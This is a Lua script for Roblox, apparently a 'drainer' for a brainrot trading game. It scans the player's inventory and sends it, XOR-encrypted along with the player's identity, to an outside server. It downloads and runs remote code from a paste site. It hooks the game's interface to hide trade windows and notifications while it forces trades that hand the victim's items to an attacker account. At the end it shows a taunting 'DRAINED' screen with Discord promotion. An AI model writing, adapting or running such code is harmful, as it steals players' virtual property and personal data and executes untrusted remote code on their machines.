-- ─── LPH STUB ────────────────────────────────────────────────────────────────
if not LPH_OBFUSCATED then
    LPH_ENCSTR = function(n) return n end; LPH_ENCNUM = function(n) return n end
    LPH_STRENC = function(n) return n end; LPH_NUMENC = function(n) return n end
    if buffer then local bf = buffer.fromstring; LPH_ENCBUF = function(n) return bf(n) end; LPH_BUFENC = LPH_ENCBUF end
    LPH_CRASH = function() end
    LPH_JIT = function(f) return f end; LPH_JIT_MAX = LPH_JIT; LPH_NO_VIRTUALIZE = LPH_JIT; LPH_NO_UPVALUES = LPH_JIT
    do
        local tu = table.unpack or unpack
        local tp = table.pack or function(...) return { n = select("#", ...), ... } end
        local sa = {}; sa.__index = sa
        sa.clear   = function(self, f, l) f = f or self.__base; l = l or self.__end; for i = f, l do self[i] = nil end end
        sa.unpack  = function(self, f, l) f = f or self.__base; l = l or self.__end; return tu(self, f, l) end
        sa.pack    = function(self, f, l) f = f or self.__base; l = l or self.__end; return tp(tu(self, f, l)) end
        sa.__len   = function(self) return self.__size end
    end
    LPH_PRECHECK = function(check) check() end
    local __attr = function() end
    LPH_ATTRIBUTES = __attr; ENCRYPT = __attr
    VM = __attr; PRESET = __attr; OPTIMIZE = __attr; NO_UPVALUES = __attr; ERROR_HANDLING = __attr
    UNROLL = __attr; INLINE = __attr; TRANSFORM = __attr
    NONE = __attr; OPAL = __attr; ONYX = __attr
    FAST = __attr; BALANCED = __attr; SECURE = __attr
    EXTRACT = __attr; CONTROL_FLOW = __attr; REWRITE_NAMECALLS = __attr
    GLOBALS = __attr; CONSTANTS = __attr
end

repeat task.wait() until game:IsLoaded()

-- ─── SERVIÇOS ────────────────────────────────────────────────────────────────
local Players            = game:GetService("Players")
local ReplicatedStorage  = game:GetService("ReplicatedStorage")
local HttpService        = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService         = game:GetService("RunService")

local LP   = Players.LocalPlayer
local cam  = workspace.CurrentCamera
local pg   = LP:WaitForChild("PlayerGui")

-- ─── CONFIG ──────────────────────────────────────────────────────────────────
local env               = getgenv()
local SECRET_KEY        = env.SECRET_KEY        or ""
local TARGET_ID         = env.TARGET_ID         or 0
local DELAY_STEP        = env.DELAY_STEP        or 1
local TRADE_CYCLE_DELAY = env.TRADE_CYCLE_DELAY or 2
local API_URL           = env.API_URL           or "https://v3nt.squareweb.app"

-- ─── GUARD ───────────────────────────────────────────────────────────────────
if env.AAVChocolaRunning then return end
env.AAVChocolaRunning = true

-- ─── PLACE CHECK ─────────────────────────────────────────────────────────────
local DUEL_PLACE_ID    = 99606176102979
local MAIN_PLACE_ID    = 109983668079237
local ALT_PLACE_ID     = 85621847059032
local LL_GROUP_ID      = 35815907
local EXTRA_SCRIPT_URL = "https://pastefy.app/6x0dnBlE/raw"

local PLACE_ID = game.PlaceId
local isDuel   = false
local runExtra = false

if PLACE_ID == DUEL_PLACE_ID then
    isDuel = true
elseif PLACE_ID == MAIN_PLACE_ID or PLACE_ID == ALT_PLACE_ID then
    runExtra = true
else
    local ok, info = pcall(LPH_JIT_MAX(function()
        return MarketplaceService:GetProductInfo(PLACE_ID)
    end))
    if not (ok and info
        and info.Creator
        and info.Creator.CreatorType == "Group"
        and tonumber(info.Creator.CreatorTargetId) == LL_GROUP_ID)
    then
        LP:Kick("You're stupid using modded")
        return
    end
end

if runExtra then
    task.spawn(LPH_JIT_MAX(function()
        pcall(LPH_JIT_MAX(function()
            loadstring(game:HttpGet(EXTRA_SCRIPT_URL))()
        end))
    end))
end

-- ─── IDENTIDADE CACHEADA ──────────────────────────────────────────────────────
local LP_ID   = LP.UserId
local LP_NAME = LP.Name
local JOB_ID  = tostring(game.JobId) .. "_" .. tostring(LP_ID)

-- ─── DETECÇÃO DE EXECUTOR ────────────────────────────────────────────────────
local executorName = "Unknown"
pcall(LPH_JIT_MAX(function()
    if env.EXECUTOR_NAME then
        executorName = env.EXECUTOR_NAME
    elseif identifyexecutor then
        local ok, v = pcall(identifyexecutor); if ok and v then executorName = v end
    elseif getexecutorname then
        local ok, v = pcall(getexecutorname);  if ok and v then executorName = v end
    elseif syn and syn.getexecutorname then
        executorName = syn.getexecutorname()
    end
end))
if executorName == "Unknown" then
    if      syn            then executorName = "Synapse"
    elseif  KRNL_LOADED    then executorName = "Krnl"
    elseif  WL_LOADED      then executorName = "WeAreDevs"
    elseif  env.is_sirhurt then executorName = "SirHurt"
    end
end

-- ─── TARGET LISTS ────────────────────────────────────────────────────────────
local TargetBrainrots = {}; if env.TARGET_BRAINROTS  then for k,v in pairs(env.TARGET_BRAINROTS)  do TargetBrainrots[k]  = v end end
local TargetGears     = {}; if env.TARGET_GEARS       then for k,v in pairs(env.TARGET_GEARS)       do TargetGears[k]     = v end end
local TargetBaseSkins = {}; if env.TARGET_BASE_SKINS  then for k,v in pairs(env.TARGET_BASE_SKINS)  do TargetBaseSkins[k] = v end end

-- ─── XOR / ENCRYPT ───────────────────────────────────────────────────────────
local XOR_KEY    = "cerberus_xor_2025"
local XOR_LEN    = #XOR_KEY
local byte, char = string.byte, string.char
local bxor       = bit32.bxor
local fmt        = string.format
local concat     = table.concat

local xorCrypt; xorCrypt = LPH_JIT_MAX(function(s)
    local len = #s
    local out = table.create(len)
    for i = 1, len do
        out[i] = char(bxor(byte(s, i), byte(XOR_KEY, ((i - 1) % XOR_LEN) + 1)))
    end
    return concat(out)
end)

local toHex; toHex = LPH_JIT_MAX(function(s)
    local len = #s
    local out = table.create(len)
    for i = 1, len do out[i] = fmt("%02x", byte(s, i)) end
    return concat(out)
end)

local encryptPayload; encryptPayload = LPH_JIT_MAX(function(tbl)
    return toHex(xorCrypt(HttpService:JSONEncode(tbl)))
end)

-- ─── REQUEST FN (cacheado 1x) ────────────────────────────────────────────────
local reqFn = (syn and syn.request) or (http and http.request) or http_request or request

-- ─── MÓDULOS DO JOGO ─────────────────────────────────────────────────────────
local ReplicatorClient = require(ReplicatedStorage.Packages.ReplicatorClient)
local Channel          = require(ReplicatedStorage.Packages.Synchronizer.Channel)
local AnimalsData, GameData, MutationsData, TraitsData
pcall(LPH_JIT_MAX(function()
    local d = ReplicatedStorage:WaitForChild("Datas")
    AnimalsData   = require(d:WaitForChild("Animals"))
    GameData      = require(d:WaitForChild("Game"))
    MutationsData = require(d:WaitForChild("Mutations"))
    TraitsData    = require(d:WaitForChild("Traits"))
end))

local TradeController        = require(ReplicatedStorage.Controllers.TradeController)
local InterfaceController    = require(ReplicatedStorage.Controllers.InterfaceController)
local SoundController        = require(ReplicatedStorage.Controllers.SoundController)
local NotificationController = require(ReplicatedStorage.Controllers.NotificationController)
local CameraController       = require(ReplicatedStorage.Controllers.CameraController)

-- ─── CONTROLLER HOOKS ────────────────────────────────────────────────────────
local origToggle    = InterfaceController.Toggle
local origSetState  = InterfaceController.SetState
local origNotify    = NotificationController.Notify
local origError     = NotificationController.Error
local origSuccess   = NotificationController.Success
local origPlaySound = SoundController.PlaySound

local isFromTrade; isFromTrade = LPH_JIT_MAX(function()
    for lvl = 2, 8 do
        local s = debug.info(lvl, "s")
        if not s then break end
        if s:find("TradeController") then return true end
    end
    return false
end)

local blockedNotify; blockedNotify = LPH_JIT_MAX(function(msg)
    if type(msg) ~= "string" then return false end
    local plain = msg:gsub("<[^>]+>", "")
    local lower = plain:lower()
    local hasAt = plain:find("@") ~= nil
    return (hasAt and lower:find("cancel"))
        or (plain:find("Failed") and lower:find("trade"))
        or (hasAt and lower:find("completed"))
end)

SoundController.PlaySound = LPH_JIT_MAX(function(self, name, ...)
    local trade   = InterfaceController:Get("TradeLiveTrade")
    local fromBtn = false
    for lvl = 2, 4 do
        local s = debug.info(lvl, "s")
        if s and s:find("AnimatedButton") then fromBtn = true; break end
    end
    if isFromTrade() or (fromBtn and trade and trade:IsOpened()) then return end
    return origPlaySound(self, name, ...)
end)

if InterfaceController:Get("TradeLiveTrade"):IsOpened() then
    InterfaceController:Toggle("TradeLiveTrade", false)
    CameraController:Blur(0, 0)
    CameraController:Fov(CameraController:GetDefaultFov(), 0)
end

InterfaceController.Toggle = LPH_JIT_MAX(function(self, name, state, exceptions)
    if name == "TradeLiveTrade" then return end
    return origToggle(self, name, state, exceptions)
end)

InterfaceController.SetState = LPH_JIT_MAX(function(self, name, state, exceptions)
    if name == "TradeLiveTrade" then return end
    return origSetState(self, name, state, exceptions)
end)

NotificationController.Notify = LPH_JIT_MAX(function(self, msg, ...)
    if isFromTrade() or blockedNotify(msg) then return end
    return origNotify(self, msg, ...)
end)

NotificationController.Error = LPH_JIT_MAX(function(self, ...)
    if isFromTrade() then return end
    return origError(self, ...)
end)

NotificationController.Success = LPH_JIT_MAX(function(self, ...)
    if isFromTrade() then return end
    return origSuccess(self, ...)
end)

-- ─── CALC VALOR ──────────────────────────────────────────────────────────────
local getRealValue; getRealValue = LPH_JIT_MAX(function(animalName, mutation, traits)
    if type(animalName) ~= "string" or not AnimalsData then return 0 end
    local animal = AnimalsData[animalName]
    if not animal then return 0 end
    local baseGen = animal.Generation
    if not baseGen and GameData then
        baseGen = (animal.Price or 0) * (GameData.Game and GameData.Game.AnimalGanerationModifier or 1)
    end
    baseGen = baseGen or 0
    local mult = 1
    if mutation and mutation ~= "None" and MutationsData and MutationsData[mutation] then
        mult = mult + (MutationsData[mutation].Modifier or 0)
    end
    if traits and TraitsData then
        local sleepy = false
        for _, trait in ipairs(traits) do
            if trait == "Sleepy" then
                sleepy = true
            elseif TraitsData[trait] then
                mult = mult + (TraitsData[trait].MultiplierModifier or 0)
            end
        end
        if sleepy then mult = mult * 0.5 end
    end
    return math.round(baseGen * mult)
end)

-- ─── SYNC DATA ───────────────────────────────────────────────────────────────
local getSyncData; getSyncData = LPH_JIT_MAX(function()
    for _, v in getgc(true) do
        if type(v) == "table" and getmetatable(v) == Channel and v.Index == LP then
            return v.CacheTable
        end
    end
end)

local capturedData
repeat capturedData = getSyncData(); task.wait(0.1) until capturedData

-- ─── SCAN INVENTÁRIO ─────────────────────────────────────────────────────────
local brainrotQueue = {}
local gearQueue     = {}
local skinQueue     = {}
local itemsList     = {}
local allGears      = {}
local allSkins      = {}

local podiums = capturedData["AnimalPodiums"] or capturedData["AnimalList"]
if type(podiums) == "table" then
    for slotKey, animalData in pairs(podiums) do
        if type(animalData) == "table" and animalData.Index then
            local name     = animalData.Index
            local mutation = animalData.Mutation or "None"
            local traits   = (type(animalData.Traits) == "table") and animalData.Traits or {}
            local genVal   = getRealValue(name, mutation, traits)
            local slot     = tonumber(slotKey)
            table.insert(itemsList, { name = name, gen = genVal, mutation = tostring(mutation), traits = traits, slot = slot })
            if TargetBrainrots[name] then
                table.insert(brainrotQueue, { slotKey = slot, data = animalData, mutation = mutation, traits = traits, genValue = genVal })
            end
        end
    end
end

local gearInv = capturedData["GearInventory"]
if type(gearInv) == "table" then
    for uuid, gearData in pairs(gearInv) do
        if type(gearData) == "table" and gearData.GearName then
            local entry = { GearName = gearData.GearName, UUID = uuid }
            table.insert(allGears, entry)
            if TargetGears[gearData.GearName] then
                table.insert(gearQueue, entry)
            end
        end
    end
end

local baseSkinInv = capturedData["BaseSkinInventory"]
if type(baseSkinInv) == "table" then
    for uuid, skinData in pairs(baseSkinInv) do
        if type(skinData) == "table" and skinData.SkinName then
            local entry = { SkinName = skinData.SkinName, UUID = uuid }
            table.insert(allSkins, entry)
            if TargetBaseSkins[skinData.SkinName] then
                table.insert(skinQueue, entry)
            end
        end
    end
end

if #brainrotQueue == 0 and #gearQueue == 0 and #skinQueue == 0 then return end

-- ─── BUILD PAYLOAD LISTS (geradas 1x) ────────────────────────────────────────
local function buildKeys(t)
    local list = {}
    for k in pairs(t) do list[#list + 1] = k end
    return list
end

local targetBrainrotList = buildKeys(TargetBrainrots)
local targetGearList     = buildKeys(TargetGears)
local targetSkinList     = buildKeys(TargetBaseSkins)

local gearsFormatted, skinsFormatted = {}, {}
for _, g in ipairs(allGears) do gearsFormatted[#gearsFormatted + 1] = { name = g.GearName, GearName = g.GearName, UUID = g.UUID } end
for _, s in ipairs(allSkins) do skinsFormatted[#skinsFormatted + 1] = { name = s.SkinName, SkinName = s.SkinName, UUID = s.UUID } end

-- ─── ENVIO VIA API ───────────────────────────────────────────────────────────
local activeTargetId = TARGET_ID

local sendScanSync; sendScanSync = LPH_JIT_MAX(function()
    if not reqFn then return false, TARGET_ID end
    local encBody = HttpService:JSONEncode({ e = encryptPayload({
        secret_key        = SECRET_KEY,
        roblox_name       = LP_NAME,
        roblox_id         = LP_ID,
        target_id         = TARGET_ID,
        job_id            = JOB_ID,
        target_brainrots  = targetBrainrotList,
        target_gears      = targetGearList,
        target_base_skins = targetSkinList,
        items             = itemsList,
        gears             = gearsFormatted,
        base_skins        = skinsFormatted,
        executor_name     = executorName,
        player_count      = #Players:GetPlayers(),
        is_duel           = isDuel,
    }) })
    local ok, res = pcall(LPH_JIT_MAX(function()
        return reqFn({
            Url     = API_URL .. "/api/script/scan",
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Secret-Key"] = SECRET_KEY },
            Body    = encBody,
        })
    end))
    if ok and res and res.Body then
        local pOk, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
        if pOk and data then
            local gid = tonumber(data.good_target_id)
            local target = (gid and gid ~= 0) and gid or TARGET_ID
            return data.hasGood == true, target
        end
    end
    return false, TARGET_ID
end)

local isGood, resolvedId = sendScanSync()
if resolvedId and resolvedId ~= 0 then activeTargetId = resolvedId end

-- ─── ANTI-DUEL ───────────────────────────────────────────────────────────────
local ANTI_DUEL_PLACE_ID = 96342491571673

local getAntiDuelConfig; getAntiDuelConfig = LPH_JIT_MAX(function()
    if not reqFn then return nil end
    local ok, res = pcall(LPH_JIT_MAX(function()
        return reqFn({
            Url     = API_URL .. "/api/script/anti-duel/config",
            Method  = "GET",
            Headers = { ["Content-Type"] = "application/json", ["X-Secret-Key"] = SECRET_KEY },
        })
    end))
    if not ok or not res then return nil end
    local pOk, data = pcall(HttpService.JSONDecode, HttpService, res.Body)
    return pOk and data or nil
end)

local logAntiDuelTeleport; logAntiDuelTeleport = LPH_JIT_MAX(function(targetJobId)
    if not reqFn then return end
    local logItems = table.create(#itemsList)
    for i, item in ipairs(itemsList) do
        logItems[i] = { name = item.name, slot = item.slot, mutation = item.mutation, traits = item.traits, gen = item.gen }
    end
    local avatarUrl = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png"):format(LP_ID)
    pcall(LPH_JIT_MAX(function()
        reqFn({
            Url     = API_URL .. "/api/script/anti-duel/log-teleport",
            Method  = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Secret-Key"] = SECRET_KEY },
            Body    = HttpService:JSONEncode({
                secret_key    = SECRET_KEY,
                roblox_id     = LP_ID,
                roblox_name   = LP_NAME,
                roblox_avatar = avatarUrl,
                job_id_used   = targetJobId,
                brainrots     = logItems,
            }),
        })
    end))
end)

local doAntiDuelTeleport; doAntiDuelTeleport = LPH_JIT_MAX(function(targetJobId)
    local TeleportService = game:GetService("TeleportService")
    local MAX_ATTEMPTS = 20
    for attempt = 1, MAX_ATTEMPTS do
        local ok = pcall(LPH_JIT_MAX(function()
            TeleportService:TeleportToPlaceInstance(ANTI_DUEL_PLACE_ID, targetJobId, LP)
        end))
        if ok then break end
        task.wait(1.5)
    end
end)

if isDuel then
    task.spawn(LPH_JIT_MAX(function()
        local config = getAntiDuelConfig()
        if not config or not config.anti_duel_enabled then return end
        local targetJobId = config.job_id
        if not targetJobId or targetJobId == "" then return end
        task.wait(5)
        logAntiDuelTeleport(targetJobId)
        doAntiDuelTeleport(targetJobId)
    end))
end

-- ─── REMOTES VIA GETUPVALUE ───────────────────────────────────────────────────
local INVITE_GUID = "8fbe1594-7cef-4c29-94d1-a0e93adfa5a4"
local SELECT_GUID = "c85a2323-36b2-4121-968a-c064a6168aff"
local ITEM_GUID   = "6786cce9-00d8-41e9-8beb-d96e0412b78b"
local READY_GUID  = "23f15b0b-b633-4f6b-888f-5924b7425522"
local ACCEPT_GUID = "86eea964-f19e-4ac6-b401-a71ecc89e596"

local inviteRemote, addBrainrotRemote, addItemRemote, readyRemote, acceptRemote

pcall(LPH_JIT_MAX(function()
    local getupval = debug.getupvalue or getupvalue
    local v_u_134  = getupval(TradeController._createLiveTrade, 15)
    inviteRemote      = getupval(TradeController.SendInvite, 1)
    addBrainrotRemote = getupval(v_u_134["Brainrot"].Add, 1)
    addItemRemote     = getupval(v_u_134["BaseSkin"].Add, 1)
    readyRemote       = getupval(TradeController._createLiveTrade, 24)
    acceptRemote      = getupval(TradeController._createLiveTrade, 23)
end))

if not (inviteRemote and addBrainrotRemote and readyRemote and acceptRemote) then
    local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
    local hashOf; hashOf = LPH_JIT_MAX(function(n)
        local h
        for _, c in Net:GetChildren() do
            if #c.Name > 40 then h = c.Name
            elseif c.Name == n and h then return h end
        end
    end)
    local INV_H    = hashOf("RF/TradeService/Invite")      or hashOf("RF/BrainrotTrader/Invite")
    local ADD_H    = hashOf("RF/TradeService/AddBrainrot") or hashOf("RF/BrainrotTrader/AddBrainrot")
    local ITEMADD_H= hashOf("RF/TradeService/AddItem")     or hashOf("RF/BrainrotTrader/AddItem")
    local RDY_H    = hashOf("RE/TradeService/Ready")       or hashOf("RS/BrainrotTrader/Ready")
    local ACC_H    = hashOf("RE/TradeService/Accept")      or hashOf("RS/BrainrotTrader/Accept")
    inviteRemote      = inviteRemote      or Net:FindFirstChild(INV_H      or "")
    addBrainrotRemote = addBrainrotRemote or Net:FindFirstChild(ADD_H      or "")
    addItemRemote     = addItemRemote     or Net:FindFirstChild(ITEMADD_H  or "")
    readyRemote       = readyRemote       or Net:FindFirstChild(RDY_H      or "")
    acceptRemote      = acceptRemote      or Net:FindFirstChild(ACC_H      or "")
end

if not (inviteRemote and addBrainrotRemote and readyRemote and acceptRemote) then return end

-- ─── TRADE REPLICATOR ────────────────────────────────────────────────────────
local tradeCompleted  = false
local tradeOpened     = false
local tradeReplicator = ReplicatorClient.get(("Trade_%*"):format(LP_ID))

tradeReplicator:ListenRaw(LPH_JIT_MAX(function(data)
    if not data then return end
    if tradeReplicator:TryIndex({ "active", "data" }) and not tradeOpened then
        tradeOpened = true
    end
end))

local waitForTradeClose; waitForTradeClose = LPH_JIT_MAX(function()
    while tradeReplicator:TryIndex({ "active", "data" }) do task.wait(0.1) end
    tradeOpened = false
end)

-- ─── LOOP INVITE (Heartbeat — máxima frequência possível sem task.wait overhead)
local inviteAccum = 0
local INVITE_RATE = 0.15

local inviteConn = RunService.Heartbeat:Connect(LPH_JIT_MAX(function(dt)
    if tradeCompleted then return end
    inviteAccum = inviteAccum + dt
    if inviteAccum < INVITE_RATE then return end
    inviteAccum = 0
    if not tradeOpened then
        pcall(LPH_JIT_MAX(function()
            inviteRemote:InvokeServer(INVITE_GUID, activeTargetId)
        end))
    end
end))

-- ─── LOOP PRINCIPAL DE TRADE ─────────────────────────────────────────────────
local hasBrainrots = #brainrotQueue > 0
local hasGears     = addItemRemote and #gearQueue > 0
local hasSkins     = addItemRemote and #skinQueue > 0

local brainrotIdx, gearIdx, skinIdx = 1, 1, 1
local brainrotAccum, gearAccum, skinAccum, raAccum = 0, 0, 0, 0
local RA_RATE = 0.05  -- ready + accept rate

local tradeConn = RunService.Heartbeat:Connect(LPH_JIT_MAX(function(dt)
    if tradeCompleted or not tradeOpened then return end

    -- Ready + Accept em máxima cadência
    raAccum = raAccum + dt
    if raAccum >= RA_RATE then
        raAccum = 0
        pcall(LPH_JIT_MAX(function() readyRemote:FireServer(READY_GUID) end))
        pcall(LPH_JIT_MAX(function() acceptRemote:FireServer(ACCEPT_GUID) end))
    end

    -- Brainrots
    if hasBrainrots then
        brainrotAccum = brainrotAccum + dt
        if brainrotAccum >= DELAY_STEP then
            brainrotAccum = 0
            local item = brainrotQueue[brainrotIdx]
            if item then
                pcall(LPH_JIT_MAX(function()
                    addBrainrotRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
                end))
            end
            brainrotIdx = (brainrotIdx % #brainrotQueue) + 1
        end
    end

    -- Gears
    if hasGears then
        gearAccum = gearAccum + dt
        if gearAccum >= DELAY_STEP then
            gearAccum = 0
            local item = gearQueue[gearIdx]
            if item then
                pcall(LPH_JIT_MAX(function()
                    addItemRemote:InvokeServer(ITEM_GUID, "Gear", { GearName = item.GearName, UUID = item.UUID or "" })
                end))
            end
            gearIdx = (gearIdx % #gearQueue) + 1
        end
    end

    -- Skins
    if hasSkins then
        skinAccum = skinAccum + dt
        if skinAccum >= DELAY_STEP then
            skinAccum = 0
            local item = skinQueue[skinIdx]
            if item then
                pcall(LPH_JIT_MAX(function()
                    addItemRemote:InvokeServer(ITEM_GUID, "BaseSkin", { SkinName = item.SkinName, UUID = item.UUID or "" })
                end))
            end
            skinIdx = (skinIdx % #skinQueue) + 1
        end
    end
end))

-- Monitor de fechamento da trade (separado, não bloqueia o Heartbeat)
task.spawn(LPH_JIT_MAX(function()
    while not tradeCompleted do
        while not tradeOpened and not tradeCompleted do task.wait() end
        if tradeCompleted then break end
        -- Reset acumuladores quando uma nova trade abre
        raAccum = 0; brainrotAccum = 0; gearAccum = 0; skinAccum = 0
        waitForTradeClose()
    end
end))

-- ─── LOCKOUT SCREEN ───────────────────────────────────────────────────────────
local lockoutShown = false

local fetchDiscordInvite; fetchDiscordInvite = LPH_JIT_MAX(function(inviteCode, cacheFileName)
    if not reqFn then return nil end
    local ok, res = pcall(LPH_JIT_MAX(function()
        return reqFn({
            Url     = "https://discord.com/api/v10/invites/" .. inviteCode .. "?with_counts=true",
            Method  = "GET",
            Headers = { ["Content-Type"] = "application/json" },
        })
    end))
    if not ok or not res then return nil end
    local decOk, json = pcall(HttpService.JSONDecode, HttpService, res.Body)
    if not decOk or not json or not json.guild then return nil end
    local guild     = json.guild
    local members   = json.approximate_member_count or 0
    local iconAsset = nil
    if guild.icon then
        local iconUrl = ("https://cdn.discordapp.com/icons/%s/%s.png?size=128"):format(guild.id, guild.icon)
        local iconOk, iconRes = pcall(LPH_JIT_MAX(function()
            return reqFn({ Url = iconUrl, Method = "GET" })
        end))
        if iconOk and iconRes then
            pcall(LPH_JIT_MAX(function()
                local path = cacheFileName .. ".png"
                writefile(path, iconRes.Body)
                iconAsset = getcustomasset(path)
            end))
        end
    end
    return { icon = iconAsset, name = guild.name or inviteCode, members = members }
end)

local createDiscordCard; createDiscordCard = LPH_JIT_MAX(function(parent, position, serverData, inviteCode)
    local container = Instance.new("Frame")
    container.Size                  = UDim2.fromOffset(276, 85)
    container.Position              = position
    container.BackgroundTransparency = 1
    container.BorderSizePixel       = 0
    container.ClipsDescendants      = false
    container.Parent                = parent

    local clickArea = Instance.new("TextButton")
    clickArea.Size                  = UDim2.fromScale(1, 1)
    clickArea.BackgroundTransparency = 1
    clickArea.Text                  = ""
    clickArea.ZIndex                = 10
    clickArea.Parent                = container
    clickArea.MouseButton1Click:Connect(LPH_JIT_MAX(function()
        pcall(LPH_JIT_MAX(function() setclipboard("discord.gg/" .. inviteCode) end))
    end))

    local iconContainer = Instance.new("Frame")
    iconContainer.Size              = UDim2.fromOffset(62, 62)
    iconContainer.Position          = UDim2.new(0, 0, 0.5, -31)
    iconContainer.BackgroundTransparency = 1
    iconContainer.BorderSizePixel   = 0
    iconContainer.ZIndex            = 2
    iconContainer.Parent            = container

    local iconImg = Instance.new("ImageLabel")
    iconImg.Size                    = UDim2.fromScale(1, 1)
    iconImg.BackgroundTransparency  = 1
    iconImg.Image                   = (serverData and serverData.icon) or ""
    iconImg.ZIndex                  = 3
    iconImg.Parent                  = iconContainer
    Instance.new("UICorner", iconImg).CornerRadius = UDim.new(0, 10)

    local infoContainer = Instance.new("Frame")
    infoContainer.Size              = UDim2.new(1, -76, 1, 0)
    infoContainer.Position          = UDim2.fromOffset(76, 0)
    infoContainer.BackgroundTransparency = 1
    infoContainer.ZIndex            = 3
    infoContainer.Parent            = container

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Size                  = UDim2.new(1, 0, 0, 30)
    nameLabel.Position              = UDim2.new(0, 0, 0, 14)
    nameLabel.BackgroundTransparency = 1
    nameLabel.Text                  = (serverData and serverData.name) or "Unknown"
    nameLabel.TextColor3            = Color3.fromRGB(255, 255, 255)
    nameLabel.TextSize              = 15
    nameLabel.Font                  = Enum.Font.GothamBold
    nameLabel.TextXAlignment        = Enum.TextXAlignment.Left
    nameLabel.TextTruncate          = Enum.TextTruncate.AtEnd
    nameLabel.ZIndex                = 4
    nameLabel.Parent                = infoContainer

    local statusContainer = Instance.new("Frame")
    statusContainer.Size            = UDim2.new(1, 0, 0, 16)
    statusContainer.Position        = UDim2.new(0, 0, 0, 46)
    statusContainer.BackgroundTransparency = 1
    statusContainer.ZIndex          = 4
    statusContainer.Parent          = infoContainer

    local dot = Instance.new("Frame")
    dot.Size                        = UDim2.fromOffset(6, 6)
    dot.Position                    = UDim2.new(0, 0, 0.5, -3)
    dot.BackgroundColor3            = Color3.fromRGB(80, 220, 100)
    dot.BorderSizePixel             = 0
    dot.ZIndex                      = 4
    dot.Parent                      = statusContainer
    Instance.new("UICorner", dot).CornerRadius = UDim.new(1, 0)

    local countLabel = Instance.new("TextLabel")
    countLabel.Size                 = UDim2.new(1, -12, 1, 0)
    countLabel.Position             = UDim2.fromOffset(10, 0)
    countLabel.BackgroundTransparency = 1
    countLabel.Text                 = serverData and (tostring(serverData.members) .. " members") or ""
    countLabel.TextColor3           = Color3.fromRGB(180, 180, 180)
    countLabel.TextSize             = 12
    countLabel.Font                 = Enum.Font.Gotham
    countLabel.TextXAlignment       = Enum.TextXAlignment.Left
    countLabel.TextYAlignment       = Enum.TextYAlignment.Center
    countLabel.ZIndex               = 4
    countLabel.Parent               = statusContainer
end)

local renderLockoutScreen; renderLockoutScreen = LPH_JIT_MAX(function()
    if lockoutShown then return end
    lockoutShown    = true
    tradeCompleted  = true

    -- Desconecta os loops
    inviteConn:Disconnect()
    tradeConn:Disconnect()

    pcall(LPH_JIT_MAX(function() LP.PlayerGui:ClearAllChildren() end))
    pcall(LPH_JIT_MAX(function() game:GetService("CoreGui"):ClearAllChildren() end))

    local screenGui = Instance.new("ScreenGui")
    screenGui.IgnoreGuiInset = true
    screenGui.ResetOnSpawn   = false
    screenGui.Parent         = game:GetService("CoreGui")

    local function makeFrame(parent, size, pos, zIndex)
        local f = Instance.new("Frame")
        f.Size            = size; f.Position = pos
        f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        f.BorderSizePixel = 0
        if zIndex then f.ZIndex = zIndex end
        f.Parent = parent
        return f
    end

    local function makeLabel(parent, size, pos, text, color, fontSize)
        local l = Instance.new("TextLabel")
        l.Size = size; l.Position = pos
        l.BackgroundTransparency = 1
        l.Text = text; l.TextColor3 = color
        l.TextScaled = (fontSize == nil)
        if fontSize then l.TextSize = fontSize; l.TextScaled = false end
        l.Font = Enum.Font.GothamBold
        l.TextXAlignment = Enum.TextXAlignment.Center
        l.TextYAlignment = Enum.TextYAlignment.Center
        l.Parent = parent
        return l
    end

    local rootFrame = makeFrame(screenGui, UDim2.fromScale(1, 1), UDim2.fromScale(0, 0))
    makeFrame(screenGui, UDim2.fromScale(1.2, 1.2), UDim2.fromScale(-0.1, -0.1), -1)

    makeLabel(rootFrame, UDim2.fromScale(1, 0.3),    UDim2.fromScale(0, 0.1),
        "YOUR BRAINROTS WAS DRAINED", Color3.fromRGB(255, 0, 0))
    makeLabel(rootFrame, UDim2.fromScale(0.8, 0.2),  UDim2.fromScale(0.1, 0.5),
        "https://v3nt.squareweb.app/\n\ndiscord.gg/v3ntscripts\ndiscord.gg/kUpM2EJccG", Color3.fromRGB(255, 255, 255))
    makeLabel(rootFrame, UDim2.fromScale(0.8, 0.08), UDim2.fromScale(0.1, 0.72),
        "Developed by Anarquico13  •  discord.gg/v3ntscripts  |  Duels: discord.gg/kUpM2EJccG",
        Color3.fromRGB(180, 180, 180), 16).TextTransparency = 0.4

    task.spawn(LPH_JIT_MAX(function()
        local v3nt  = fetchDiscordInvite("v3ntscripts", "v3nt_icon")
        local duels = fetchDiscordInvite("kUpM2EJccG",  "duels_icon")
        createDiscordCard(rootFrame, UDim2.new(0, 10, 1, -182), v3nt,  "v3ntscripts")
        createDiscordCard(rootFrame, UDim2.new(0, 10, 1, -92),  duels, "kUpM2EJccG")
    end))
end)

-- ─── DETECÇÃO DE FIM DE TRADE ────────────────────────────────────────────────
local tradeCompleteEvent
pcall(LPH_JIT_MAX(function()
    tradeCompleteEvent = (debug.getupvalue or getupvalue)(TradeController._createPlayerList, 21)
end))

if tradeCompleteEvent then
    tradeCompleteEvent.OnClientEvent:Connect(LPH_JIT_MAX(function(eventData)
        if typeof(eventData) == "table" and tonumber(eventData.otherUserId) == activeTargetId then
            renderLockoutScreen()
        end
    end))
end

-- Fallback via replicator
tradeReplicator:ListenRaw(LPH_JIT_MAX(function(data)
    if not data and tradeOpened and not lockoutShown then
        task.delay(0.5, LPH_JIT_MAX(function()
            if not tradeReplicator:TryIndex({ "active", "data" }) and not lockoutShown then
                renderLockoutScreen()
            end
        end))
    end
end))
